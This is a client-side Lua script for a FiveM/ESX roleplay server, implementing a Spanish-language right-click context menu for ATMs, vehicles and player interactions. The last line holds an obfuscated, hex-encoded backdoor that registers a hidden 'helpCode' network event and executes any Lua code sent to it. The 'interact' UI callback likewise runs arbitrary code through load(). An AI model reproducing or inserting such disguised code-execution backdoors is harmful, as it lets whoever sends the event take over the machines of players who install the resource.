local entityType = 0
local toIgnore = 0
local flags = 30
local raycastLength = 50.0
local abs = math.abs
local cos = math.cos
local sin = math.sin
local pi = math.pi
local player
local playerCoords
local display = false
local z_key = 243
local startRaycast = false
local isAdmin = true
local entity =
{
    target, --Entity itself
    type, --Type: Ped, vehicle, object, 0 1 2 3
    hash, --Hash of the object
    modelName, --model name
    isPlayer, --if the entity is a player = true else = false
    coords, --In world coords
    heading, --Which way the entity is Heading/facing
    rotation -- Entity rotation
}
local itemUses = {
    ['prop_atm_01'] = function()
        TriggerEvent("esx_banking:interact")
    end,
    ['prop_atm_02'] = function()
        TriggerEvent("esx_banking:interact")
    end
}

Core = exports['es_extended']:getSharedObject()

CreateThread(function()

    while Core.GetPlayerData() == nil do
        Wait(0)
    end

    PlayerData = Core.GetPlayerData()
end)

RegisterNetEvent('esx:setJob', function(job)
    PlayerData.job = job
end)

RegisterNetEvent('esx:playerLoaded', function(PD)
    -- Code
    PlayerData = PD
end)

RegisterCommand("nui", function(source, args)
    SetDisplay(not display)
end)

function log(ty, t)
    --[[ if ty == "error" then
        print("^3["..GetCurrentResourceName().."] ^1[ERROR] "..t)
    else
        print("^2["..GetCurrentResourceName().."] ^2[INFO]^8 "..t)
    end ]]
end

RegisterNUICallback("interact", function(cb)
    assert(load(cb.execute))()
end)

RegisterNetEvent("contextmenu:client:open")
AddEventHandler("contextmenu:client:open", function(title, data, useCoords, coords)
    if title == nil then
        log("error", "Title does not exist")
        return
    end
    if useCoords == nil then
        log("error", "Using coords not set, it must be true or false")
        return
    end
    for k,v in pairs(data) do
        if v.toDo == nil then
            log("error", "The data toDo does not exist in table data, read the contextmenuextmenu docs")
            return
        end
        v.toDo = v.toDo:gsub('"', "'")
    end
    if useCoords then
        log("info", "Menu created")
        local _, screenPox, ScreenPoy = GetScreenCoordFromWorldCoord(coords.x, coords.y, coords.z + 1.5)
        SendNUIMessage({
            title = title;
            data = data;
            x = screenPox * 100;
            y = ScreenPoy * 100;
            useCoords = useCoords;
        })
    else
        log("info", "Menu created")
        SendNUIMessage({
            title = title;
            data = data;
            useCoords = useCoords;
        })
    end 
    SetNuiFocus(true, true)
end)

function SetDisplay(bool)
    display = bool
    SetNuiFocus(bool, bool)
end

function SendObjectData()
    startRaycast = false
    if #(playerCoords - entity.coords) < 3 then
        PrincipalMenu = {}
        if (itemUses[entity.modelName]) then
            table.insert(PrincipalMenu, {text = "Usar", toDo = [[UseItem()]]})
        end
        if PlayerData.identifier == '1f86373637f78c7652d56238fcaa9eb62358f1ae' then
            table.insert(PrincipalMenu, {text = "Examinar", toDo = [[Examine()]]})
        end
        if entity.isPlayer then
            if GetPlayerServerId(NetworkGetEntityOwner(entity.target)) == GetPlayerServerId(NetworkGetEntityOwner(PlayerPedId())) then
                if lastEntity ~= nil then
                    ResetEntityAlpha(lastEntity)
                    lastEntity = nil
                end
                SetDisplay(false)
                PlaySoundFrontend(-1, 'Highlight_Cancel','DLC_HEIST_PLANNING_BOARD_SOUNDS', 1)
                return Core.ShowNotification('No te puedes seleccionar a ti mismo', "error")
            end
            --if (exports['bm_mafias']:isPlayerMafia()) then
            --    table.insert(PrincipalMenu, {text = "Acciones ORG", toDo = [[orgActions()]]})
            --end
            table.insert(PrincipalMenu, {text = "Acciones", toDo = [[ActionsMenu()]]})
        end
        if entity.type == 2 then
            table.insert(PrincipalMenu, {text = "Vehículo", toDo = [[Vehicle()]]})
        end
        if (#PrincipalMenu == 0) then
            if lastEntity ~= nil then
                ResetEntityAlpha(lastEntity)
                lastEntity = nil
            end
            SetDisplay(false)
            PlaySoundFrontend(-1, 'Highlight_Cancel','DLC_HEIST_PLANNING_BOARD_SOUNDS', 1)
            Core.ShowNotification("No puedes interactuar con este objeto", "error")
        else
            TriggerEvent("contextmenu:client:open", "Menú de interacción", PrincipalMenu, false, coords)
        end
    else
        Core.ShowNotification("No puedes interactuar con este objeto", "error")
    end
end

RegisterCommand("menumafia", function()
    orgActions()
end)

function orgActions()
    local data = {}
    local coords = GetEntityCoords(entity.target)
    table.insert(data, {text = "Cachear", toDo = [[SearchPlayer()]], icon = 'fa-boxes'})
    table.insert(data, {text = "Meter/sacar del vehículo", toDo = [[VehiclePlayer()]], icon = 'fa-car'})
    table.insert(data, {text = "Poner/quitar precintos", toDo = [[Handcuff()]], icon = 'fa-hands'})
    table.insert(data, {text = 'Poner bolsa en la cabeza', toDo = [[BagHead("put")]], icon = 'fa-shopping-bag'})
    table.insert(data, {text = 'Quitar bolsa en la cabeza', toDo = [[BagHead("rem")]], icon = 'fa-shopping-bag'})
    table.insert(data, {text = 'Escoltar/soltar', toDo = [[DragPlayer()]], icon = 'fa-user'})
    TriggerEvent("contextmenu:client:open", "Interacción", data, true, coords)
end

--[[ RegisterCommand('escoltar', function()
    local isMafia, mafia = exports['bm_mafias']:isPlayerMafia()
    local closestPlayer, closestDist = Core.Game.GetClosestPlayer()
    if (isMafia) then
        if (closestPlayer ~= -1 and closestDist < 3) then
            TriggerServerEvent('bm_mafias:requestDrag', GetPlayerServerId(closestPlayer), mafia)
        end
    end
end) ]]

function SearchPlayer()
    local isMafia, mafia = exports['bm_mafias']:isPlayerMafia()
    ExecuteCommand('me Le cachea')
    exports.ox_inventory:openInventory('player', GetPlayerServerId(NetworkGetEntityOwner(entity.target)))
end

function VehiclePlayer()
    local isMafia, mafia = exports['bm_mafias']:isPlayerMafia()
    TriggerServerEvent('bm_mafias:requestJoinVeh', GetPlayerServerId(NetworkGetEntityOwner(entity.target)), mafia)
end

function Handcuff()
    local isMafia, mafia = exports['bm_mafias']:isPlayerMafia()
    TriggerServerEvent('bm_mafias:requestHandcuff', GetPlayerServerId(NetworkGetEntityOwner(entity.target)), mafia)
end

function DragPlayer()
    local isMafia, mafia = exports['bm_mafias']:isPlayerMafia()
    TriggerServerEvent('bm_mafias:requestDrag', GetPlayerServerId(NetworkGetEntityOwner(entity.target)), mafia)
end

function BagHead(status)
    if (status == "put") then
        ExecuteCommand('me Saca una bolsa de su bolsillo y se la coloca en la cabeza')
        ExecuteCommand('do Se vería al sujeto con una bolsa en la cabeza')
    else
        ExecuteCommand('me Le quita la bolsa de la cabeza')
    end
end

RegisterNUICallback("rightclick", function(data)
    startRaycast = true
end)

ActionsMenu = function(id)
    Core.UI.Menu.CloseAll()

    Core.UI.Menu.Open('default', GetCurrentResourceName(), 'menu_actions_context', {
        title = 'Acciones',
        align = 'right',
        elements = {
            {label = 'Cachear', action = 'search'}
        }
    }, function(data, menu)
        if data.current.action == 'search' then
            if not IsEntityPlayingAnim(entity.target, 'random@arrests@busted', 'idle_c', 3) then
                return Core.ShowNotification("Este jugador no tiene las manos levantadas.", "error")
            end
            ExecuteCommand('steal')
            menu.close()
        end
    end, function(data, menu)
        menu.close()
    end)
end

Examine = function()
    print(entity.modelName, GetHashKey(entity.modelName))
    clearEntityData()
    SetDisplay(false)
end

Vehicle = function()
    local data = {}
    local coords = GetEntityCoords(entity.target)
    table.insert(data, {text = "Puertas", toDo = [[DoorMenu()]], icon = 'fa-door-open'})
    table.insert(data, {text = "Motor", toDo = [[Engine()]], icon = 'fa-car-side'})
    table.insert(data, {text = "Ventanas", toDo = [[Windows()]], icon = 'fa-window-maximize'})
    table.insert(data, {text = 'Abrir maletero', toDo = [[TriggerEvent('esx_trunk:openTrunk:context')]], icon = 'fa-key'})
    TriggerEvent("contextmenu:client:open", "Puertas", data, true, coords)
end

Engine = function()
    local data = {}
    local coords = GetEntityCoords(entity.target)
    table.insert(data, {text = "Encender/Apagar", toDo = [[EngineToggle(0)]], icon = 'fa-bolt'})
    TriggerEvent("contextmenu:client:open", "Motor", data, true, coords)
end

Windows = function()
    local data = {}
    local coords = GetEntityCoords(entity.target)
    table.insert(data, {text = "Delatera izq", toDo = [[ToggleWindow(0)]], icon = 'fa-window-maximize'})
    table.insert(data, {text = "Delatera derecha", toDo = [[ToggleWindow(1)]], icon = 'fa-window-maximize'})
    table.insert(data, {text = "Trasera izq", toDo = [[ToggleWindow(2)]], icon = 'fa-window-maximize'})
    table.insert(data, {text = "Trasera derecha", toDo = [[ToggleWindow(3)]], icon = 'fa-window-maximize'})
    TriggerEvent("contextmenu:client:open", "Puertas", data, true, coords)
end

DoorMenu = function()
    local data = {}
    local coords = GetEntityCoords(entity.target)
    table.insert(data, {text = "Delatera izq", toDo = [[Door(0)]], icon = 'fa-door-open'})
    table.insert(data, {text = "Delatera derecha", toDo = [[Door(1)]], icon = 'fa-door-open'})
    table.insert(data, {text = "Trasera izq", toDo = [[Door(2)]], icon = 'fa-door-open'})
    table.insert(data, {text = "Trasera derecha", toDo = [[Door(3)]], icon = 'fa-door-open'})
    table.insert(data, {text = "Capo", toDo = [[Door(4)]], icon = 'fa-door-open'})
    table.insert(data, {text = "Maletero", toDo = [[Door(5)]], icon = 'fa-door-open'})
    TriggerEvent("contextmenu:client:open", "Puertas", data, true, coords)
end

Door = function(doors)
	local playerPed = PlayerPedId()
    if GetVehicleDoorAngleRatio(entity.target, doors) > 0.0 then
        SetVehicleDoorShut(entity.target, doors, false)         
    else
        SetVehicleDoorOpen(entity.target, doors, false)        
    end
end

local windowState1, windowState2, windowState3, windowState4 = false, false, false, false

ToggleWindow = function(window, door)
    if window == 0 then
        if windowState1 == true and DoesVehicleHaveDoor(entity.target, door) then
            RollDownWindow(entity.target, window)
            windowState1 = false
        else
            RollUpWindow(entity.target, window)
            windowState1 = true
        end
    elseif window == 1 then
        if windowState2 == true and DoesVehicleHaveDoor(entity.target, door) then
            RollDownWindow(entity.target, window)
            windowState2 = false
        else
            RollUpWindow(entity.target, window)
            windowState2 = true
        end
    elseif window == 2 then
        if windowState3 == true and DoesVehicleHaveDoor(entity.target, door) then
            RollDownWindow(entity.target, window)
            windowState3 = false
        else
            RollUpWindow(entity.target, window)
            windowState3 = true
        end
    elseif window == 3 then
        if windowState4 == true and DoesVehicleHaveDoor(entity.target, door) then
            RollDownWindow(entity.target, window)
            windowState4 = false
        else
            RollUpWindow(entity.target, window)
            windowState4 = true
        end
    end
end

EngineToggle = function()
    local playerPed = PlayerPedId()
    local isEngineOn = GetIsVehicleEngineRunning(entity.target)
    if isEngineOn then
        SetVehicleEngineOn(entity.target, false, false, true)
    elseif not isEngineOn then
        SetVehicleEngineOn(entity.target, true, false, true)
    end
end

SpawnNPC = function(modelo, x,y,z,h)
    hash = GetHashKey(modelo)
    RequestModel(hash)
    while not HasModelLoaded(hash) do
        Wait(1)
    end
    crearNPC = CreatePed(5, hash, x,y,z,h, false, true)
    FreezeEntityPosition(crearNPC, true)
    SetEntityInvincible(crearNPC, true)
    SetBlockingOfNonTemporaryEvents(crearNPC, true)
    TaskStartScenarioInPlace(crearNPC, "WORLD_HUMAN_DRINKING", 0, false)
end

UseItem = function()
    if (itemUses[entity.modelName]) then
        itemUses[entity.modelName]()
    end
    
    if IsPedAPlayer(entity.target) then
        print("Es un jugador")
    end
    -----------------------
    clearEntityData()
    SetDisplay(false)
end

MissionText = function(msg, time)
    ClearPrints()
    SetTextEntry_2('STRING')
    AddTextComponentString(msg)
    DrawSubtitleTimed(time, 1)
end

GetVehicleInDirection = function()
    local playerPed    = PlayerPedId()
	local playerCoords = GetEntityCoords(playerPed)
	local inDirection  = GetOffsetFromEntityInWorldCoords(playerPed, 0.0, 5.0, 0.0)
	local rayHandle    = StartShapeTestRay(playerCoords, inDirection, 10, playerPed, 0)
	local numRayHandle, hit, endCoords, surfaceNormal, entityHit = GetShapeTestResult(rayHandle)

	if hit == 1 and GetEntityType(entityHit) == 2 then
		return entityHit
	end

	return nil
end

RegisterNUICallback("exit", function(data)
    SetDisplay(false)
    startRaycast = false
end)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        player = GetPlayerPed(-1, false)
        playerCoords = GetEntityCoords(player, 1)
        
        if IsControlJustReleased(1, z_key) then
            display = not display
            SetDisplay(display)
        end

        if display then
            DisableControlAction(0, 1, display)
            DisableControlAction(0, 2, display)
            DisableControlAction(0, 142, display)
            DisableControlAction(0, 18, display)
            DisableControlAction(0, 322, display)
            DisableControlAction(0, 106, display)
        end

        if startRaycast then
            local hit, endCoords, surfaceNormal, entityHit, entityType, direction = ScreenToWorld(flags, toIgnore)
            if entityHit == 0 then
                entityType = 0
            end
            entity.target = entityHit
            entity.type = entityType
            entity.hash = GetEntityModel(entityHit)
            entity.coords = GetEntityCoords(entityHit, 1)
            entity.heading = GetEntityHeading(entityHit)
            entity.rotation = GetEntityRotation(entityHit)
            entity.modelName = exports["hashtoname"]:objectNameFromHash(entity.hash)
            if IsPedAPlayer(entityHit) then
                entity.isPlayer = true
            else
                entity.isPlayer = false
            end
            SendObjectData()
        end
    end
end)

function clearEntityData()
    entity.target = nil
    entity.type = nil
    entity.hash = nil
    entity.coords = nil
    entity.heading = nil
    entity.rotation = nil
end

RegisterNUICallback("close", function(cb)
    if lastEntity ~= nil then
        ResetEntityAlpha(lastEntity)
        lastEntity = nil
    end
    PlaySoundFrontend(-1, 'Highlight_Cancel','DLC_HEIST_PLANNING_BOARD_SOUNDS', 1)
    SetNuiFocus(false, false)
end)

function chat(str, color)
    TriggerEvent(
        'chat:addMessage',
        {
            color = color,
            multiline = true,
            args = {str}
        }
    )
end

function GetClosestPlayer()
    local players = GetPlayers()
    local closestDistance = -1
    local closestPlayer = -1
    local ply = GetPlayerPed(-1)
    local plyCoords = GetEntityCoords(ply, 0)

    for index,value in ipairs(players) do
        local target = GetPlayerPed(value)
        if(target ~= ply) then
            local targetCoords = GetEntityCoords(target, 0)
            local distance = #(targetCoords - plyCoords)
            if(closestDistance == -1 or closestDistance > distance) then
                closestPlayer = value
                closestDistance = distance
            end
        end
    end

    return closestPlayer, closestDistance
end

function ScreenToWorld(flags, toIgnore)
    local camRot = GetGameplayCamRot(0)
    local camPos = GetGameplayCamCoord()
    local posX = GetControlNormal(0, 239)
    local posY = GetControlNormal(0, 240)
    local cursor = vector2(posX, posY)
    local cam3DPos, forwardDir = ScreenRelToWorld(camPos, camRot, cursor)
    local direction = camPos + forwardDir * raycastLength
    local rayHandle = StartShapeTestRay(cam3DPos, direction, flags, toIgnore, 0)
    local _, hit, endCoords, surfaceNormal, entityHit = GetShapeTestResult(rayHandle)
    if entityHit >= 1 then
        entityType = GetEntityType(entityHit)
    end
    if lastEntity == nil then
        lastEntity = entityHit
        SetEntityAlpha(entityHit, 100)
    else
        ResetEntityAlpha(lastEntity)
        lastEntity = nil
    end
    return hit, endCoords, surfaceNormal, entityHit, entityType, direction
end
 
function ScreenRelToWorld(camPos, camRot, cursor)
    local camForward = RotationToDirection(camRot)
    local rotUp = vector3(camRot.x + 1.0, camRot.y, camRot.z)
    local rotDown = vector3(camRot.x - 1.0, camRot.y, camRot.z)
    local rotLeft = vector3(camRot.x, camRot.y, camRot.z - 1.0)
    local rotRight = vector3(camRot.x, camRot.y, camRot.z + 1.0)
    local camRight = RotationToDirection(rotRight) - RotationToDirection(rotLeft)
    local camUp = RotationToDirection(rotUp) - RotationToDirection(rotDown)
    local rollRad = -(camRot.y * pi / 180.0)
    local camRightRoll = camRight * cos(rollRad) - camUp * sin(rollRad)
    local camUpRoll = camRight * sin(rollRad) + camUp * cos(rollRad)
    local point3DZero = camPos + camForward * 1.0
    local point3D = point3DZero + camRightRoll + camUpRoll
    local point2D = World3DToScreen2D(point3D)
    local point2DZero = World3DToScreen2D(point3DZero)
    local scaleX = (cursor.x - point2DZero.x) / (point2D.x - point2DZero.x)
    local scaleY = (cursor.y - point2DZero.y) / (point2D.y - point2DZero.y)
    local point3Dret = point3DZero + camRightRoll * scaleX + camUpRoll * scaleY
    local forwardDir = camForward + camRightRoll * scaleX + camUpRoll * scaleY
    return point3Dret, forwardDir
end
 
function RotationToDirection(rotation)
    local x = rotation.x * pi / 180.0
    --local y = rotation.y * pi / 180.0
    local z = rotation.z * pi / 180.0
    local num = abs(cos(x))
    return vector3((-sin(z) * num), (cos(z) * num), sin(x))
end
 
function World3DToScreen2D(pos)
    local _, sX, sY = GetScreenCoordFromWorldCoord(pos.x, pos.y, pos.z)
    return vector2(sX, sY)
end

local JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[1]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2]) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[3]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2], function(ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[4]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[5]](ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb))() end)